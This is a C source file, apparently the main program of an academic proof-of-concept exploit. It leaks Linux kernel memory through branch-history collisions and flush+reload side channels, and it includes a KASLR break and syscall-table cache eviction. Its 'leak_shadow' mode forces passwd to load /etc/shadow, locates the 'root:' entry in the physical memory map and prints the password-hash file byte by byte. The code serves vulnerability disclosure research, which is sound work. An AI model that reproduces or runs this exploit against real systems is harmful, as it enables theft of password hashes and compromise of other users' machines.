/*
 * Tuesday, May 16th 2023
 *
 * Sander Wiebing - s.j.wiebing@student.vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/time.h>

#include "targets.h"
#include "flush_and_reload.h"
#include "colliding_bhb.h"
#include "../../poc-common/common.h"

#include "../../poc-common/kaslr_prefetch/kaslr_prefetch.h"
#include "../../poc-common/l2_eviction/evict_sys_table_l2.h"

#define MAX_SHADOW_LENGTH 0x1000
#define DEFAULT_SHADOW_SYMBOL '$'


void load_shadow_file() {
    // ------------------------------------------------------------------------
    // Trigger passwd to bring it in memory

    char system_str[100];
    sprintf(system_str, "taskset -c 0 passwd -S 2>&1");
    // Output once the output to terminal
    (void) (system(system_str) + 1);

    sprintf(system_str, "taskset -c 0 passwd -S 2>&1 > /dev/null");
    for (int i = 0; i < 10; i++) {
        (void) (system(system_str) + 1);
    }
}

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------

void leak_shadow_file(struct config * cfg, char shadow_symbol) {
    uint64_t prefix, prefix_offset, search_offset, hits;
    int found;

    uint8_t * secret_kern = cfg->phys_start;
    cfg->reload_addr = cfg->fr_buf;

    set_load_chain_leak_secret(cfg);

    // ------------------------------------------------------------------------
    // Find the location of the shadow file in memory

    char * leaked_bytes = calloc(1, MAX_SHADOW_LENGTH);
    strcpy(leaked_bytes, "root:");

    printf("Finding prefix 0x%08x\n", *(uint32_t *) leaked_bytes);
    printf("\rTesting address: %p [%50s]", secret_kern, "");

    int step = 0;
    fflush(stdout);

    for (; secret_kern <= cfg->phys_end; secret_kern += 0x1000)
    {
        if (secret_kern == cfg->ind_map) {
            // we passed the huge_page, we can skip this
            secret_kern += HUGE_PAGE_SIZE - 0x1000;
            continue;
        }

        if ((uint64_t) secret_kern % (HUGE_PAGE_SIZE * 2) == 0) {
            printf("\rTesting address: %p ", secret_kern);
            fflush(stdout);

            if ((secret_kern -  cfg->phys_start) > (((cfg->phys_end - cfg->phys_start) / 50) * step)) {
                step++;
                printf("[%.*s", step, "..................................................");
                fflush(stdout);
            }
        }

        // Test for honey page
        if ((uint64_t) secret_kern % (HUGE_PAGE_SIZE) == 0) {
            hits = is_signature_at_address(cfg, *((uint32_t *)((char *)HONEY_PAGE_SIGNATURE + 1)), secret_kern + 1, 5);
            if (hits) {
                printf("\r    >> Honey page at address %p! Skipping 2MB\n", secret_kern);
                secret_kern += HUGE_PAGE_SIZE - 0x1000;
                continue;
            }
        }

        // Test for the signature
        hits = is_signature_at_address(cfg, *(uint32_t *) (leaked_bytes + 1), (secret_kern + 1), 10);

        if (!hits) {
            continue;
        }

        prefix = *(uint32_t *) (leaked_bytes + 2);
        *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET + 2;

        found = leak_byte_forwards(cfg, prefix);

        for (size_t i = 0; i < 100 && found == -1; i++) {
            found = leak_byte_forwards(cfg, prefix);
        }
        if (found == -1) {
            // redo address
            secret_kern -= 0x1000;
            continue;
        }

        if(found != shadow_symbol) {
            printf("\r    >> Found 'root:%c' (0x%02x) at address, skipping..: %p\n",
                found >= 0x20 && found <= 0x7E ? found : ' ', found, secret_kern);
            continue;
        }

        printf("\nFound prefix 0x%010lx (%s) at address: %p\n", *(uint64_t *) leaked_bytes, leaked_bytes, secret_kern);
        break;


    }

    if (secret_kern > cfg->phys_end) {
        printf("\nFailed finding shadow file, please restart\n");
        exit(0);
    }

    // ------------------------------------------------------------------------
    // Leak the shadow content

    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 5;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET + 2;

    printf("\nShadow content:\n");
    printf("============================================================\n");
    printf("%s", leaked_bytes);
    fflush(stdout);

    for (int i = 4; i < MAX_SHADOW_LENGTH; i++)
    {
        prefix = *(uint32_t *) (cur_byte - 3);

        found = leak_byte_forwards(cfg, prefix);

        if (found == -1) {
            continue;
        }

        *cur_byte = found;

        if (*cur_byte == '\0') {
            break;
        }

        printf("%c", *cur_byte >= 0xa && *cur_byte < 0x7E ? *cur_byte : '.');
        fflush(stdout);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;
    }

    printf("\n============================================================\n");

}

#define DUMMY_SECRET_LENGTH 32

void leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    // Initialize secret
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    memset(secret, 0x0, 5);

    // To test the zero extend prefix
    secret[5] = '\xff';

    for (size_t i = 6; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 6);
    }

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET + 1;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 4;

    prefix = *(uint32_t *) (cur_byte - 3);


    for (unsigned i = 4; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *(uint32_t *) (cur_byte - 3);
        printf("Using prefix: 0x%08lx\n", prefix);


        found = leak_byte_forwards(cfg, prefix);

        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;

        printf("0x%03x: Found Byte: 0x%02x (%c) Used prefix: 0x%08lx\n", i, *cur_byte, *cur_byte, prefix);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

}

#define LEAK_RATE_TEST_SIZE (1 << 15) // 32 kB; NOTE: max HUGE_PAGE_SIZE - 0x2000

void leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We set the the F+R buf to the second 4k page in the huge page
    cfg->fr_buf = cfg->ind_map + 0x1000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;

    // We initialize the secret from the third 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = (uint8_t) rand();
    }
    memset(secret, 0, 3); // First 3 bytes are zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    set_load_chain_leak_secret(cfg);
    cfg->reload_addr = cfg->fr_buf;

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 3;

    prefix = *(uint32_t *) (cur_byte - 3);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;

    gettimeofday(&t0, NULL);


    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *(uint32_t *) (cur_byte - 3);

        found = leak_byte_forwards(cfg, prefix);

        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;


        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / 50) == 0) {
            step++;
            printf("\r[%.*s", step, "..................................................");
            fflush(stdout);
        }

    }

    gettimeofday(&t1, NULL);

    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);


}

// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------



int main(int argc, char **argv)
{
    struct config cfg = {0};
    int opt;
    uint8_t use_proc_map = 0;
    uint64_t sys_call_table_off = 0x260; // VM Default
    uint64_t time_start;
    char shadow_symbol = DEFAULT_SHADOW_SYMBOL;

    uint8_t leak_mode = 0;

    while ((opt = getopt(argc, argv, "c:o:s:p")) != -1) {
        switch (opt) {
            case 'o':
                sscanf(optarg, "0x%lx", &sys_call_table_off);
                break;
            case 's':
                shadow_symbol = *optarg;
                break;
            case 'p': use_proc_map = 1; break;
            default:
                printf("Usage:\n"
                "%s {leak_shadow, leak_dummy, test_rate} [options]\n"
                    "  -o OFFSET          sys_call table offset (hex)\n"
                    "  -s CHARACTER       Shadow-file symbol (default: $)\n"
                    "  -p                 Enable the use of proc pagemap (sudo)\n"
                    , argv[0]);
                exit(1);
        }
    }

    if (optind + 1 < argc) {
        printf("Usage:\n"
        "%s {leak_shadow, leak_dummy, test_rate} [options]\n"
            "  -o OFFSET          sys_call table offset (hex)\n"
            "  -s CHARACTER       Shadow-file symbol (default: $)\n"
            "  -p                 Enable the use of proc pagemap (sudo)\n"
            , argv[0]);
        exit(1);
    } else if (optind < argc) {

        if(strcmp(argv[optind], "test_rate") == 0) {
            leak_mode = 0;
        } else if(strcmp(argv[optind], "leak_dummy") == 0) {
            leak_mode = 1;
        } else if(strcmp(argv[optind], "leak_shadow") == 0) {
            leak_mode = 2;
        } else {
            printf("Invalid leakage mode, choose between: \n- test_rate \n- leak_dummy \n- leak_shadow\n");
            exit(0);
        }
    }

    switch (leak_mode) {
    case 0:
        printf("Testing the leakage rate\n");
        break;
    case 1:
        printf("Leaking a dummy secret\n");
        break;
    case 2:
        printf("Leaking the shadow file\n");
        load_shadow_file();
        break;
    default:
        break;
    }

    int seed = time(0);
    printf("Seed: %d\n", seed);
    srand(seed);

    // ------------------------------------------------------------------------
    // Allocate a huge page

    cfg.ind_map = allocate_huge_page();

    // ------------------------------------------------------------------------
    // Find Eviction set for syscall table

    printf("------------------------------------------------------\n");
    printf("Finding eviction set for syscall table\n");
    printf("------------------------------------------------------\n");

    time_start = time(0);

    find_ev_set_for_sys_call_table(sys_call_table_off);

    printf("[+] Step took: %ldsec\n", time(0) - time_start);

    // ------------------------------------------------------------------------
    // Find the physical map start by KASLR break

    printf("------------------------------------------------------\n");
    printf("Find physical map start address\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);

    for (size_t i = 0; i < 5 && cfg.phys_start == 0; i++)
    {
        cfg.phys_start = (uint8_t *) find_phys_map_start();
    }
    if (cfg.phys_start == 0) {
        printf("Failed finding Physical Map start!");
        exit(EXIT_FAILURE);
    }

    uint64_t mem_total = get_mem_total();
    cfg.phys_end = cfg.phys_start + mem_total + (1LU << 30) + (uint64_t) (mem_total * 0.2);

    printf("Direct Physical Map start: %p\n", cfg.phys_start);
    printf("[+] Step took: %ld sec\n", time(0) - time_start);

    // ------------------------------------------------------------------------
    // Setup buffers + the target fd

    cfg.history = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);

    if (access("/sys/fs/cgroup/cpu/cpu.idle", F_OK) == 0) {
        cfg.fd = open("/sys/fs/cgroup/cpu/cpu.idle", O_RDONLY);

    } else if (access("/sys/fs/cgroup/user.slice/cpu.idle", F_OK) == 0) {
        cfg.fd = open("/sys/fs/cgroup/user.slice/cpu.idle", O_RDONLY);

    } else {
        printf("Error: Cgroup file not found, please update the path\n");
    }

    assert(cfg.fd > 0);

    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page

    if (use_proc_map) {

        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));

        while ((uint64_t) cfg.ind_map_kern % HUGE_PAGE_SIZE != 0)
        {
            printf("Invalid huge_page! User: %p Kernel: %p\n", cfg.ind_map, cfg.ind_map_kern);
            sleep(1);
            cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
        }
        printf("User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);

        // initialize honey pages
        find_hp_kern_address(&cfg, 1);

        cfg.fr_buf = cfg.ind_map + HUGE_PAGE_SIZE - 0x1000;
        cfg.fr_buf_kern = cfg.ind_map_kern + HUGE_PAGE_SIZE - 0x1000;


    } else {

        time_start = time(0);
        // find the kernel address of the huge page
        printf("------------------------------------------------------\n");
        printf("Finding huge page kernel address\n");
        printf("------------------------------------------------------\n");

        if (find_hp_kern_address(&cfg, 0) != 0) {
            printf("Failed finding the huge page kernel address! please restart\n");
            exit(0);
        }

        printf("User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);

        printf("[+] Step took: %ld sec\n", time(0) - time_start);

        cfg.fr_buf = cfg.ind_map + HUGE_PAGE_SIZE - 0x1000;
        cfg.fr_buf_kern = cfg.ind_map_kern + HUGE_PAGE_SIZE - 0x1000;

    }

    // ------------------------------------------------------------------------
    // Find a colliding history

    printf("------------------------------------------------------\n");
    printf("Find a colliding history for the victim -> target\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);

    find_colliding_history(&cfg);

    printf("[+] Step took: %ld sec\n", time(0) - time_start);



    // ------------------------------------------------------------------------
    // Double check signal

    print_leakage_rate(&cfg, NULL);

    // ------------------------------------------------------------------------
    // Transmit

    switch (leak_mode) {
    case 0:
        printf("------------------------------------------------------\n");
        printf("Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
        printf("------------------------------------------------------\n");

        time_start = time(0);
        leak_test_leakage_rate(&cfg);

        break;
    case 1:

        printf("------------------------------------------------------\n");
        printf("Leaking Dummy secret\n");
        printf("------------------------------------------------------\n");

        time_start = time(0);
        leak_dummy_secret(&cfg);

        break;
    case 2:

        printf("------------------------------------------------------\n");
        printf("Leaking shadow file \n");
        printf("------------------------------------------------------\n");

        time_start = time(0);
        leak_shadow_file(&cfg, shadow_symbol);

        break;
    default:
        while (1)
        {
            print_leakage_rate(&cfg, NULL);
        }

        break;
    }

    printf("[+] Step took: %ld sec\n", time(0) - time_start);

}
